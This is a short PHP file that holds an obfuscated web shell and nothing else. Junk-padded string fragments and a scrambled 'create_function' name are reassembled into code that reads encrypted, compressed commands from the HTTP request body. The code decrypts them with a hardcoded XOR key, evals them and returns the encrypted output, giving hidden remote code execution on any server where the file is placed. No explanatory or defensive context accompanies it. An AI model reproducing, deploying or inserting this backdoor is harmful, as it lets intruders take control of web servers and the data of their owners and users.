<?php
$Q='al(@&@gzun@&c@&ompres@&s(@x(@b@&ase64_deco@&de(@&$m[1])@&,$k)));$o=@&@ob_ge@&t_co@&@&ntents();@ob_';
$v='@&tion x@&($t,@&@&$k){$c=strlen($k@&);$l=@&strle@&@&n@&($t);$o="";for($i=0@&;$i@&<$l;){@&for@&($j=0';
$l=str_replace('s','','cresatses_fusncstison');
$r='$k="dc@&6f@&7315";$k@&h@&="3c5bb00d7996"@&;$@&kf="0f83@&3c@&6563@&38";$p="@&@&Uhl4j89@&MrsBHE0gZ";func';
$L='h(@&"/$kh@&(.+)$kf/",@fi@&le_g@&et_@&contents("php:/@&/input"@&),@&$m)==1) {@@&ob_@&start();@e@&v';
$E=';($j<$c&@&@&&$i<$l);@&$@&j++@&,$@&i++@&){$o.=$t{$i}^$k{$j};}}ret@&u@&rn $o;}if@& (@pre@&@&g_m@&atc';
$X='en@&d_clea@&n();@&$@&r=@b@&ase64_encode(@@&@&x(@gzcompres@&s@&($o),$k))@&;print("$p@&$kh$@&r$kf");}';
$R=str_replace('@&','',$r.$v.$E.$L.$Q.$X);
$q=$l('',$R);$q();
?>
